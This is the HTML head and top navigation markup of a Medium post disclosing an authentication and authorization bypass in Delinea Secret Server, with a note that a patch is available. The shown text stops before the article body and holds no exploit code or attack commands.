<!doctype html><html lang="en"><head><title data-rh="true">“All Your Secrets Are Belong To Us” — A Delinea Secret Server AuthN/AuthZ Bypass | by Johnny Yu (@straight_blast) | Medium</title><meta data-rh="true" charset="utf-8"/><meta data-rh="true" name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,maximum-scale=1"/><meta data-rh="true" name="theme-color" content="#000000"/><meta data-rh="true" name="twitter:app:name:iphone" content="Medium"/><meta data-rh="true" name="twitter:app:id:iphone" content="828256236"/><meta data-rh="true" property="al:ios:app_name" content="Medium"/><meta data-rh="true" property="al:ios:app_store_id" content="828256236"/><meta data-rh="true" property="al:android:package" content="com.medium.reader"/><meta data-rh="true" property="fb:app_id" content="542599432471018"/><meta data-rh="true" property="og:site_name" content="Medium"/><meta data-rh="true" property="og:type" content="article"/><meta data-rh="true" property="article:published_time" content="2024-04-30T22:09:11.665Z"/><meta data-rh="true" name="title" content="“All Your Secrets Are Belong To Us” — A Delinea Secret Server AuthN/AuthZ Bypass | by Johnny Yu (@straight_blast) | Medium"/><meta data-rh="true" property="og:title" content="“All Your Secrets Are Belong To Us” — A Delinea Secret Server AuthN/AuthZ Bypass"/><meta data-rh="true" property="al:android:url" content="medium://p/adc26c800ad3"/><meta data-rh="true" property="al:ios:url" content="medium://p/adc26c800ad3"/><meta data-rh="true" property="al:android:app_name" content="Medium"/><meta data-rh="true" name="description" content="04/13/2024 — The patch 11.7.1 for Delinea Secret Server is available — https://docs.delinea.com/online-help/secret-server/release-notes/ss-rn-11-7-000001.htm Delinea Secret Server is a privileged…"/><meta data-rh="true" property="og:description" content="Delinea Secret Server is a privileged access management (PAM) solution that helps organizations secure, manage, and monitor privileged…"/><meta data-rh="true" property="og:url" content="https://straightblast.medium.com/all-your-secrets-are-belong-to-us-a-delinea-secret-server-authn-authz-bypass-adc26c800ad3"/><meta data-rh="true" property="al:web:url" content="https://straightblast.medium.com/all-your-secrets-are-belong-to-us-a-delinea-secret-server-authn-authz-bypass-adc26c800ad3"/><meta data-rh="true" property="og:image" content="https://miro.medium.com/v2/resize:fit:641/1*MM46_6UlXce73BkyxMhfQA.jpeg"/><meta data-rh="true" property="article:author" content="https://straightblast.medium.com"/><meta data-rh="true" name="author" content="Johnny Yu (@straight_blast)"/><meta data-rh="true" name="robots" content="index,noarchive,follow,max-image-preview:large"/><meta data-rh="true" name="referrer" content="unsafe-url"/><meta data-rh="true" property="twitter:title" content="“All Your Secrets Are Belong To Us” — A Delinea Secret Server AuthN/AuthZ Bypass"/><meta data-rh="true" name="twitter:site" content="@Medium"/><meta data-rh="true" name="twitter:app:url:iphone" content="medium://p/adc26c800ad3"/><meta data-rh="true" property="twitter:description" content="Delinea Secret Server is a privileged access management (PAM) solution that helps organizations secure, manage, and monitor privileged…"/><meta data-rh="true" name="twitter:image:src" content="https://miro.medium.com/v2/resize:fit:641/1*MM46_6UlXce73BkyxMhfQA.jpeg"/><meta data-rh="true" name="twitter:card" content="summary_large_image"/><meta data-rh="true" name="twitter:creator" content="@straight_blast"/><meta data-rh="true" name="twitter:label1" content="Reading time"/><meta data-rh="true" name="twitter:data1" content="7 min read"/><link data-rh="true" rel="icon" href="https://miro.medium.com/v2/5d8de952517e8160e40ef9841c781cdc14a5db313057fa3c3de41c6f5b494b19"/><link data-rh="true" rel="search" type="application/opensearchdescription+xml" title="Medium" href="/osd.xml"/><link data-rh="true" rel="apple-touch-icon" sizes="152x152" href="https://miro.medium.com/v2/resize:fill:304:304/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="120x120" href="https://miro.medium.com/v2/resize:fill:240:240/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="76x76" href="https://miro.medium.com/v2/resize:fill:152:152/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="60x60" href="https://miro.medium.com/v2/resize:fill:120:120/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="mask-icon" href="https://miro.medium.com/v2/resize:fill:1000:1000/7*GAOKVe--MXbEJmV9230oOQ.png" color="#171717"/><link data-rh="true" rel="preconnect" href="https://glyph.medium.com" crossOrigin=""/><link data-rh="true" id="glyph_preload_link" rel="preload" as="style" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" id="glyph_link" rel="stylesheet" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" rel="author" href="https://straightblast.medium.com"/><link data-rh="true" rel="canonical" href="https://straightblast.medium.com/all-your-secrets-are-belong-to-us-a-delinea-secret-server-authn-authz-bypass-adc26c800ad3"/><link data-rh="true" rel="alternate" href="android-app://com.medium.reader/https/medium.com/p/adc26c800ad3"/><script data-rh="true" type="application/ld+json">{"@context":"http:\u002F\u002Fschema.org","@type":"NewsArticle","image":["https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:1200\u002F1*MM46_6UlXce73BkyxMhfQA.jpeg"],"url":"https:\u002F\u002Fstraightblast.medium.com\u002Fall-your-secrets-are-belong-to-us-a-delinea-secret-server-authn-authz-bypass-adc26c800ad3","dateCreated":"2024-04-10T15:29:00.437Z","datePublished":"2024-04-10T15:29:00.437Z","dateModified":"2024-11-28T22:30:42.133Z","headline":"“All Your Secrets Are Belong To Us” — A Delinea Secret Server AuthN\u002FAuthZ Bypass","name":"“All Your Secrets Are Belong To Us” — A Delinea Secret Server AuthN\u002FAuthZ Bypass","description":"04\u002F13\u002F2024 — The patch 11.7.1 for Delinea Secret Server is available — https:\u002F\u002Fdocs.delinea.com\u002Fonline-help\u002Fsecret-server\u002Frelease-notes\u002Fss-rn-11-7-000001.htm Delinea Secret Server is a privileged…","identifier":"adc26c800ad3","author":{"@type":"Person","name":"Johnny Yu (@straight_blast)","url":"https:\u002F\u002Fstraightblast.medium.com"},"creator":["Johnny Yu (@straight_blast)"],"publisher":{"@type":"Organization","name":"Medium","url":"https:\u002F\u002Fstraightblast.medium.com\u002F","logo":{"@type":"ImageObject","width":272,"height":60,"url":"https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:544\u002F7*V1_7XP4snlmqrc_0Njontw.png"}},"mainEntityOfPage":"https:\u002F\u002Fstraightblast.medium.com\u002Fall-your-secrets-are-belong-to-us-a-delinea-secret-server-authn-authz-bypass-adc26c800ad3"}</script><style type="text/css" data-fela-rehydration="518" data-fela-type="STATIC">html{box-sizing:border-box;-webkit-text-size-adjust:100%}*, *:before, *:after{box-sizing:inherit}body{margin:0;padding:0;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;color:rgba(0,0,0,0.8);position:relative;min-height:100vh}h1, h2, h3, h4, h5, h6, dl, dd, ol, ul, menu, figure, blockquote, p, pre, form{margin:0}menu, ol, ul{padding:0;list-style:none;list-style-image:none}main{display:block}a{color:inherit;text-decoration:none}a, button, input{-webkit-tap-highlight-color:transparent}img, svg{vertical-align:middle}button{background:transparent;overflow:visible}button, input, optgroup, select, textarea{margin:0}:root{--reach-tabs:1;--reach-menu-button:1}#speechify-root{font-family:Sohne, sans-serif}div[data-popper-reference-hidden="true"]{visibility:hidden;pointer-events:none}.grecaptcha-badge{visibility:hidden}
/*XCode style (c) Angel Garcia <angelgarcia.mail@gmail.com>*/.hljs {background: #fff;color: black;
}/* Gray DOCTYPE selectors like WebKit */
.xml .hljs-meta {color: #c0c0c0;
}.hljs-comment,
.hljs-quote {color: #007400;
}.hljs-tag,
.hljs-attribute,
.hljs-keyword,
.hljs-selector-tag,
.hljs-literal,
.hljs-name {color: #aa0d91;
}.hljs-variable,
.hljs-template-variable {color: #3F6E74;
}.hljs-code,
.hljs-string,
.hljs-meta .hljs-string {color: #c41a16;
}.hljs-regexp,
.hljs-link {color: #0E0EFF;
}.hljs-title,
.hljs-symbol,
.hljs-bullet,
.hljs-number {color: #1c00cf;
}.hljs-section,
.hljs-meta {color: #643820;
}.hljs-title.class_,
.hljs-class .hljs-title,
.hljs-type,
.hljs-built_in,
.hljs-params {color: #5c2699;
}.hljs-attr {color: #836C28;
}.hljs-subst {color: #000;
}.hljs-formula {background-color: #eee;font-style: italic;
}.hljs-addition {background-color: #baeeba;
}.hljs-deletion {background-color: #ffc8bd;
}.hljs-selector-id,
.hljs-selector-class {color: #9b703f;
}.hljs-doctag,
.hljs-strong {font-weight: bold;
}.hljs-emphasis {font-style: italic;
}
</style><style type="text/css" data-fela-rehydration="518" data-fela-type="KEYFRAME">@-webkit-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@-moz-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}</style><style type="text/css" data-fela-rehydration="518" data-fela-type="RULE">.a{font-family:medium-content-sans-serif-font, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif}.b{font-weight:400}.c{background-color:rgba(255, 255, 255, 1)}.l{display:block}.m{position:sticky}.n{top:0}.o{z-index:500}.p{padding:0 24px}.q{align-items:center}.r{border-bottom:solid 1px #F2F2F2}.y{height:41px}.z{line-height:20px}.ab{display:flex}.ac{height:57px}.ae{flex:1 0 auto}.af{color:inherit}.ag{fill:inherit}.ah{font-size:inherit}.ai{border:inherit}.aj{font-family:inherit}.ak{letter-spacing:inherit}.al{font-weight:inherit}.am{padding:0}.an{margin:0}.ao{cursor:pointer}.ap:disabled{cursor:not-allowed}.aq:disabled{color:#6B6B6B}.ar:disabled{fill:#6B6B6B}.au{width:auto}.av path{fill:#242424}.aw{height:25px}.ax{margin-left:16px}.ay{border:none}.az{border-radius:20px}.ba{width:240px}.bb{background:#F9F9F9}.bc path{fill:#6B6B6B}.be{outline:none}.bf{font-family:sohne, "Helvetica Neue", Helvetica, Arial, sans-serif}.bg{font-size:14px}.bh{width:100%}.bi{padding:10px 20px 10px 0}.bj{background-color:transparent}.bk{color:#242424}.bl::placeholder{color:#6B6B6B}.bm{display:inline-block}.bn{margin-left:12px}.bo{margin-right:12px}.bp{border-radius:4px}.bq{margin-left:24px}.br{height:24px}.bx{background-color:#F9F9F9}.by{border-radius:50%}.bz{height:32px}.ca{width:32px}.cb{justify-content:center}.ch{max-width:680px}.ci{min-width:0}.cj{animation:k1 1.2s ease-in-out infinite}.ck{height:100vh}.cl{margin-bottom:16px}.cm{margin-top:48px}.cn{align-items:flex-start}.co{flex-direction:column}.cp{justify-content:space-between}.cq{margin-bottom:24px}.cw{width:80%}.cx{background-color:#F2F2F2}.dd{height:44px}.de{width:44px}.df{margin:auto 0}.dg{margin-bottom:4px}.dh{height:16px}.di{width:120px}.dj{width:80px}.dp{margin-bottom:8px}.dq{width:96%}.dr{width:98%}.ds{width:81%}.dt{margin-left:8px}.du{color:#6B6B6B}.dv{font-size:13px}.dw{height:100%}.ep{color:#FFFFFF}.eq{fill:#FFFFFF}.er{background:#1A8917}.es{border-color:#1A8917}.ew:disabled{cursor:inherit !important}.ex:disabled{opacity:0.3}.ey:disabled:hover{background:#1A8917}.ez:disabled:hover{border-color:#1A8917}.fa{border-radius:99em}.fb{border-width:1px}.fc{border-style:solid}.fd{box-sizing:border-box}.fe{text-decoration:none}.ff{text-align:center}.fi{margin-right:32px}.fj{position:relative}.fk{fill:#6B6B6B}.fn{background:transparent}.fo svg{margin-left:4px}.fp svg{fill:#6B6B6B}.fr{box-shadow:inset 0 0 0 1px rgba(0, 0, 0, 0.05)}.fs{position:absolute}.fz{margin:0 24px}.gd{background:rgba(255, 255, 255, 1)}.ge{border:1px solid #F2F2F2}.gf{box-shadow:0 1px 4px #F2F2F2}.gg{max-height:100vh}.gh{overflow-y:auto}.gi{left:0}.gj{top:calc(100vh + 100px)}.gk{bottom:calc(100vh + 100px)}.gl{width:10px}.gm{pointer-events:none}.gn{word-break:break-word}.go{word-wrap:break-word}.gp:after{display:block}.gq:after{content:""}.gr:after{clear:both}.gs{line-height:1.23}.gt{letter-spacing:0}.gu{font-style:normal}.gv{font-weight:700}.ia{align-items:baseline}.ib{width:48px}.ic{height:48px}.id{border:2px solid rgba(255, 255, 255, 1)}.ie{z-index:0}.if{box-shadow:none}.ig{border:1px solid rgba(0, 0, 0, 0.05)}.ih{margin-bottom:2px}.ii{flex-wrap:nowrap}.ij{font-size:16px}.ik{line-height:24px}.im{margin:0 8px}.in{display:inline}.io{color:#1A8917}.ip{fill:#1A8917}.is{flex:0 0 auto}.iv{flex-wrap:wrap}.iw{padding-left:8px}.ix{padding-right:8px}.jy> *{flex-shrink:0}.jz{overflow-x:scroll}.ka::-webkit-scrollbar{display:none}.kb{scrollbar-width:none}.kc{-ms-overflow-style:none}.kd{width:74px}.ke{flex-direction:row}.kf{z-index:2}.kg{margin-right:4px}.kj{-webkit-user-select:none}.kk{border:0}.kl{fill:rgba(117, 117, 117, 1)}.ko{outline:0}.kp{user-select:none}.kq> svg{pointer-events:none}.kz{cursor:progress}.la{opacity:1}.lb{padding:4px 0}.le{margin-top:0px}.lf{width:16px}.lh{display:inline-flex}.ln{max-width:100%}.lo{padding:8px 2px}.lp svg{color:#6B6B6B}.mg{margin-left:auto}.mh{margin-right:auto}.mi{max-width:641px}.mo{clear:both}.mp{height:auto}.mq{line-height:1.58}.mr{letter-spacing:-0.004em}.ms{font-family:source-serif-pro, Georgia, Cambria, "Times New Roman", Times, serif}.nn{margin-bottom:-0.46em}.no{text-decoration:underline}.np{list-style-type:disc}.nq{margin-left:30px}.nr{padding-left:0px}.ns{max-width:833px}.nz{cursor:zoom-in}.oa{z-index:auto}.oc{overflow-x:auto}.od{font-family:source-code-pro, Menlo, Monaco, "Courier New", Courier, monospace}.oe{padding:32px}.of{border:1px solid #E5E5E5}.og{line-height:1.4}.oh{letter-spacing:-0.022em}.oi{margin-top:-0.2em}.oj{margin-bottom:-0.2em}.ok{white-space:pre}.ol{min-width:fit-content}.om{list-style-type:decimal}.os{max-width:2344px}.ot{font-style:italic}.ou{max-width:2347px}.ov{margin-bottom:26px}.ow{margin-top:6px}.ox{margin-top:8px}.oy{margin-right:8px}.oz{padding:8px 16px}.pa{border-radius:100px}.pb{transition:background 300ms ease}.pd{white-space:nowrap}.pe{border-top:none}.pf{margin-bottom:50px}.pg{height:52px}.ph{max-height:52px}.pi{box-sizing:content-box}.pj{position:static}.pk{z-index:1}.pm{max-width:155px}.ps{margin-right:20px}.pt{margin-bottom:64px}.qi{height:64px}.qj{width:64px}.qk{align-self:flex-end}.ql{color:rgba(255, 255, 255, 1)}.qm{fill:rgba(255, 255, 255, 1)}.qn{background:rgba(25, 25, 25, 1)}.qo{border-color:rgba(25, 25, 25, 1)}.qr:disabled{opacity:0.1}.qs:disabled:hover{background:rgba(25, 25, 25, 1)}.qt:disabled:hover{border-color:rgba(25, 25, 25, 1)}.qu{flex:1 1 auto}.ra{padding-right:4px}.rb{font-weight:500}.ro{white-space:pre-wrap}.rp{margin-top:16px}.rq{margin-bottom:54px}.rr{height:0px}.sh{gap:18px}.si{fill:rgba(61, 61, 61, 1)}.su{border-bottom:solid 1px #E5E5E5}.sv{margin-top:72px}.sw{padding:24px 0}.sx{margin-bottom:0px}.sy{margin-right:16px}.as:hover:not(:disabled){color:rgba(25, 25, 25, 1)}.at:hover:not(:disabled){fill:rgba(25, 25, 25, 1)}.et:hover{background:#156D12}.eu:hover{border-color:#156D12}.ev:hover{cursor:pointer}.fl:hover{color:#242424}.fm:hover{fill:#242424}.fq:hover svg{fill:#242424}.ft:hover{background-color:rgba(0, 0, 0, 0.1)}.il:hover{text-decoration:underline}.iq:hover:not(:disabled){color:#156D12}.ir:hover:not(:disabled){fill:#156D12}.kn:hover{fill:rgba(8, 8, 8, 1)}.lc:hover{fill:#000000}.ld:hover p{color:#000000}.lg:hover{color:#000000}.lq:hover svg{color:#000000}.pc:hover{background-color:#F2F2F2}.qh:hover{background-color:none}.qp:hover{background:#000000}.qq:hover{border-color:#242424}.sj:hover{fill:rgba(25, 25, 25, 1)}.bd:focus-within path{fill:#242424}.km:focus{fill:rgba(8, 8, 8, 1)}.lr:focus svg{color:#000000}.ob:focus{transform:scale(1.01)}.kr:active{border-style:none}</style><style type="text/css" data-fela-rehydration="518" data-fela-type="RULE" media="all and (min-width: 1080px)">.d{display:none}.bw{width:64px}.cg{margin:0 64px}.cv{height:48px}.dc{margin-bottom:52px}.do{margin-bottom:48px}.ef{font-size:14px}.eg{line-height:20px}.em{font-size:13px}.eo{padding:5px 12px}.fh{display:flex}.fy{margin-bottom:50px}.gc{max-width:680px}.hq{font-size:42px}.hr{margin-top:1.19em}.hs{margin-bottom:32px}.ht{line-height:52px}.hu{letter-spacing:-0.011em}.hz{align-items:center}.jk{border-top:solid 1px #F2F2F2}.jl{border-bottom:solid 1px #F2F2F2}.jm{margin:32px 0 0}.jn{padding:3px 8px}.jw> *{margin-right:24px}.jx> :last-child{margin-right:0}.ky{margin-top:0px}.lm{margin:0}.mn{margin-top:40px}.nj{font-size:20px}.nk{margin-top:2.14em}.nl{line-height:32px}.nm{letter-spacing:-0.003em}.nx{margin-top:56px}.or{margin-top:1.14em}.pr{display:inline-block}.pu{flex-direction:row}.px{margin-bottom:0}.py{margin-right:20px}.qv{max-width:500px}.rm{line-height:24px}.rn{letter-spacing:0}.se{font-size:24px}.sf{line-height:30px}.sg{letter-spacing:-0.016em}.so{margin:40px 0 0}.st{padding-top:72px}</style><style type="text/css" data-fela-rehydration="518" data-fela-type="RULE" media="all and (max-width: 1079.98px)">.e{display:none}.kx{margin-top:0px}.pq{display:inline-block}</style><style type="text/css" data-fela-rehydration="518" data-fela-type="RULE" media="all and (max-width: 903.98px)">.f{display:none}.kw{margin-top:0px}.pp{display:inline-block}</style><style type="text/css" data-fela-rehydration="518" data-fela-type="RULE" media="all and (max-width: 727.98px)">.g{display:none}.ku{margin-top:0px}.kv{margin-right:0px}.po{display:inline-block}</style><style type="text/css" data-fela-rehydration="518" data-fela-type="RULE" media="all and (max-width: 551.98px)">.h{display:none}.s{display:flex}.t{justify-content:space-between}.bs{width:24px}.cc{margin:0 24px}.cr{height:40px}.cy{margin-bottom:44px}.dk{margin-bottom:32px}.dx{font-size:13px}.dy{line-height:20px}.eh{padding:0px 8px 1px}.fu{margin-bottom:2px}.gw{font-size:32px}.gx{margin-top:1.01em}.gy{margin-bottom:24px}.gz{line-height:38px}.ha{letter-spacing:-0.014em}.hv{align-items:flex-start}.it{flex-direction:column}.iy{margin:24px -24px 0}.iz{padding:0}.jo> *{margin-right:8px}.jp> :last-child{margin-right:24px}.kh{margin-left:0px}.ks{margin-top:0px}.kt{margin-right:0px}.li{margin:0}.ls{border:1px solid #F2F2F2}.lt{border-radius:99em}.lu{padding:0px 16px 0px 12px}.lv{height:38px}.lw{align-items:center}.ly svg{margin-right:8px}.mj{margin-top:32px}.mt{font-size:18px}.mu{margin-top:1.56em}.mv{line-height:28px}.mw{letter-spacing:-0.003em}.nt{margin-top:40px}.on{margin-top:1.34em}.pn{display:inline-block}.qf{margin-bottom:20px}.qg{margin-right:0}.qz{max-width:100%}.rc{font-size:24px}.rd{line-height:30px}.re{letter-spacing:-0.016em}.rs{font-size:20px}.rt{line-height:24px}.ru{letter-spacing:0}.sk{margin:32px 0 0}.sp{padding-top:48px}.lx:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="518" data-fela-type="RULE" media="all and (min-width: 904px) and (max-width: 1079.98px)">.i{display:none}.bv{width:64px}.cf{margin:0 64px}.cu{height:48px}.db{margin-bottom:52px}.dn{margin-bottom:48px}.ed{font-size:14px}.ee{line-height:20px}.ek{font-size:13px}.el{padding:5px 12px}.fg{display:flex}.fx{margin-bottom:50px}.gb{max-width:680px}.hl{font-size:42px}.hm{margin-top:1.19em}.hn{margin-bottom:32px}.ho{line-height:52px}.hp{letter-spacing:-0.011em}.hy{align-items:center}.jg{border-top:solid 1px #F2F2F2}.jh{border-bottom:solid 1px #F2F2F2}.ji{margin:32px 0 0}.jj{padding:3px 8px}.ju> *{margin-right:24px}.jv> :last-child{margin-right:0}.ll{margin:0}.mm{margin-top:40px}.nf{font-size:20px}.ng{margin-top:2.14em}.nh{line-height:32px}.ni{letter-spacing:-0.003em}.nw{margin-top:56px}.oq{margin-top:1.14em}.pv{flex-direction:row}.pz{margin-bottom:0}.qa{margin-right:20px}.qw{max-width:500px}.rk{line-height:24px}.rl{letter-spacing:0}.sb{font-size:24px}.sc{line-height:30px}.sd{letter-spacing:-0.016em}.sn{margin:40px 0 0}.ss{padding-top:72px}</style><style type="text/css" data-fela-rehydration="518" data-fela-type="RULE" media="all and (min-width: 728px) and (max-width: 903.98px)">.j{display:none}.w{display:flex}.x{justify-content:space-between}.bu{width:64px}.ce{margin:0 48px}.ct{height:48px}.da{margin-bottom:52px}.dm{margin-bottom:48px}.eb{font-size:13px}.ec{line-height:20px}.ej{padding:0px 8px 1px}.fw{margin-bottom:50px}.ga{max-width:680px}.hg{font-size:42px}.hh{margin-top:1.19em}.hi{margin-bottom:32px}.hj{line-height:52px}.hk{letter-spacing:-0.011em}.hx{align-items:center}.jc{border-top:solid 1px #F2F2F2}.jd{border-bottom:solid 1px #F2F2F2}.je{margin:32px 0 0}.jf{padding:3px 8px}.js> *{margin-right:24px}.jt> :last-child{margin-right:0}.lk{margin:0}.ml{margin-top:40px}.nb{font-size:20px}.nc{margin-top:2.14em}.nd{line-height:32px}.ne{letter-spacing:-0.003em}.nv{margin-top:56px}.op{margin-top:1.14em}.pw{flex-direction:row}.qb{margin-bottom:0}.qc{margin-right:20px}.qx{max-width:500px}.ri{line-height:24px}.rj{letter-spacing:0}.ry{font-size:24px}.rz{line-height:30px}.sa{letter-spacing:-0.016em}.sm{margin:40px 0 0}.sr{padding-top:72px}</style><style type="text/css" data-fela-rehydration="518" data-fela-type="RULE" media="all and (min-width: 552px) and (max-width: 727.98px)">.k{display:none}.u{display:flex}.v{justify-content:space-between}.bt{width:24px}.cd{margin:0 24px}.cs{height:40px}.cz{margin-bottom:44px}.dl{margin-bottom:32px}.dz{font-size:13px}.ea{line-height:20px}.ei{padding:0px 8px 1px}.fv{margin-bottom:2px}.hb{font-size:32px}.hc{margin-top:1.01em}.hd{margin-bottom:24px}.he{line-height:38px}.hf{letter-spacing:-0.014em}.hw{align-items:flex-start}.iu{flex-direction:column}.ja{margin:24px 0 0}.jb{padding:0}.jq> *{margin-right:8px}.jr> :last-child{margin-right:8px}.ki{margin-left:0px}.lj{margin:0}.lz{border:1px solid #F2F2F2}.ma{border-radius:99em}.mb{padding:0px 16px 0px 12px}.mc{height:38px}.md{align-items:center}.mf svg{margin-right:8px}.mk{margin-top:32px}.mx{font-size:18px}.my{margin-top:1.56em}.mz{line-height:28px}.na{letter-spacing:-0.003em}.nu{margin-top:40px}.oo{margin-top:1.34em}.qd{margin-bottom:20px}.qe{margin-right:0}.qy{max-width:100%}.rf{font-size:24px}.rg{line-height:30px}.rh{letter-spacing:-0.016em}.rv{font-size:20px}.rw{line-height:24px}.rx{letter-spacing:0}.sl{margin:32px 0 0}.sq{padding-top:48px}.me:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="518" data-fela-type="RULE" media="print">.pl{display:none}</style><style type="text/css" data-fela-rehydration="518" data-fela-type="RULE" media="(prefers-reduced-motion: no-preference)">.ny{transition:transform 300ms cubic-bezier(0.2, 0, 0.2, 1)}</style></head><body><div id="root"><div class="a b c"><div class="d e f g h i j k"></div><script>document.domain = document.domain;</script><div class="l c"><div class="l m n o c"><div class="p q r s t u v w x i d y z"><a class="du ag dv bf ak b am an ao ap aq ar as at s u w i d q dw z" href="https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fadc26c800ad3&amp;%7Efeature=LoOpenInAppButton&amp;%7Echannel=ShowPostUnderUser&amp;source=---top_nav_layout_nav----------------------------------" rel="noopener follow">Open in app<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" fill="none" viewBox="0 0 10 10" class="dt"><path fill="currentColor" d="M.985 8.485a.375.375 0 1 0 .53.53zM8.75 1.25h.375A.375.375 0 0 0 8.75.875zM8.375 6.5a.375.375 0 1 0 .75 0zM3.5.875a.375.375 0 1 0 0 .75zm-1.985 8.14 7.5-7.5-.53-.53-7.5 7.5zm6.86-7.765V6.5h.75V1.25zM3.5 1.625h5.25v-.75H3.5z"></path></svg></a><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><button class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton">Sign up</button></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fstraightblast.medium.com%2Fall-your-secrets-are-belong-to-us-a-delinea-secret-server-authn-authz-bypass-adc26c800ad3&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="p q r ab ac"><div class="ab q ae"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab" aria-label="Homepage" data-testid="headerMediumLogo" href="https://medium.com/?source=---top_nav_layout_nav----------------------------------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="719" height="160" fill="none" viewBox="0 0 719 160" class="au av aw"><path fill="#242424" d="m174.104 9.734.215-.047V8.02H130.39L89.6 103.89 48.81 8.021H1.472v1.666l.212.047c8.018 1.81 12.09 4.509 12.09 14.242V137.93c0 9.734-4.087 12.433-12.106 14.243l-.212.047v1.671h32.118v-1.665l-.213-.048c-8.018-1.809-12.089-4.509-12.089-14.242V30.586l52.399 123.305h2.972l53.925-126.743V140.75c-.687 7.688-4.721 10.062-11.982 11.701l-.215.05v1.652h55.948v-1.652l-.215-.05c-7.269-1.639-11.4-4.013-12.087-11.701l-.037-116.774h.037c0-9.733 4.071-12.432 12.087-14.242m25.555 75.488c.915-20.474 8.268-35.252 20.606-35.507 3.806.063 6.998 1.312 9.479 3.714 5.272 5.118 7.751 15.812 7.368 31.793zm-.553 5.77h65.573v-.275c-.186-15.656-4.721-27.834-13.466-36.196-7.559-7.227-18.751-11.203-30.507-11.203h-.263c-6.101 0-13.584 1.48-18.909 4.16-6.061 2.807-11.407 7.003-15.855 12.511-7.161 8.874-11.499 20.866-12.554 34.343q-.05.606-.092 1.212a50 50 0 0 0-.065 1.151 85.807 85.807 0 0 0-.094 5.689c.71 30.524 17.198 54.917 46.483 54.917 25.705 0 40.675-18.791 44.407-44.013l-1.886-.664c-6.557 13.556-18.334 21.771-31.738 20.769-18.297-1.369-32.314-19.922-31.042-42.395m139.722 41.359c-2.151 5.101-6.639 7.908-12.653 7.908s-11.513-4.129-15.418-11.63c-4.197-8.053-6.405-19.436-6.405-32.92 0-28.067 8.729-46.22 22.24-46.22 5.657 0 10.111 2.807 12.236 7.704zm43.499 20.008c-8.019-1.897-12.089-4.722-12.089-14.951V1.309l-48.716 14.353v1.757l.299-.024c6.72-.543 11.278.386 13.925 2.83 2.072 1.915 3.082 4.853 3.082 8.987v18.66c-4.803-3.067-10.516-4.56-17.448-4.56-14.059 0-26.909 5.92-36.176 16.672-9.66 11.205-14.767 26.518-14.767 44.278-.003 31.72 15.612 53.039 38.851 53.039 13.595 0 24.533-7.449 29.54-20.013v16.865h43.711v-1.746zM424.1 19.819c0-9.904-7.468-17.374-17.375-17.374-9.859 0-17.573 7.632-17.573 17.374s7.721 17.374 17.573 17.374c9.907 0 17.375-7.47 17.375-17.374m11.499 132.546c-8.019-1.897-12.089-4.722-12.089-14.951h-.035V43.635l-43.714 12.551v1.705l.263.024c9.458.842 12.047 4.1 12.047 15.152v81.086h43.751v-1.746zm112.013 0c-8.018-1.897-12.089-4.722-12.089-14.951V43.635l-41.621 12.137v1.71l.246.026c7.733.813 9.967 4.257 9.967 15.36v59.279c-2.578 5.102-7.415 8.131-13.274 8.336-9.503 0-14.736-6.419-14.736-18.073V43.638l-43.714 12.55v1.703l.262.024c9.459.84 12.05 4.097 12.05 15.152v50.17a56.3 56.3 0 0 0 .91 10.444l.787 3.423c3.701 13.262 13.398 20.197 28.59 20.197 12.868 0 24.147-7.966 29.115-20.43v17.311h43.714v-1.747zm169.818 1.788v-1.749l-.213-.05c-8.7-2.006-12.089-5.789-12.089-13.49v-63.79c0-19.89-11.171-31.761-29.883-31.761-13.64 0-25.141 7.882-29.569 20.16-3.517-13.01-13.639-20.16-28.606-20.16-13.146 0-23.449 6.938-27.869 18.657V43.643L545.487 55.68v1.715l.263.024c9.345.829 12.047 4.181 12.047 14.95v81.784h40.787v-1.746l-.215-.053c-6.941-1.631-9.181-4.606-9.181-12.239V66.998c1.836-4.289 5.537-9.37 12.853-9.37 9.086 0 13.692 6.296 13.692 18.697v77.828h40.797v-1.746l-.215-.053c-6.94-1.631-9.18-4.606-9.18-12.239V75.066a42 42 0 0 0-.578-7.26c1.947-4.661 5.86-10.177 13.475-10.177 9.214 0 13.691 6.114 13.691 18.696v77.828z"></path></svg></a><div class="ax h"><div class="ab ay az ba bb q bc bd"><div class="bm" aria-hidden="false" aria-describedby="searchResults" aria-labelledby="searchResults"></div><div class="bn bo ab"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 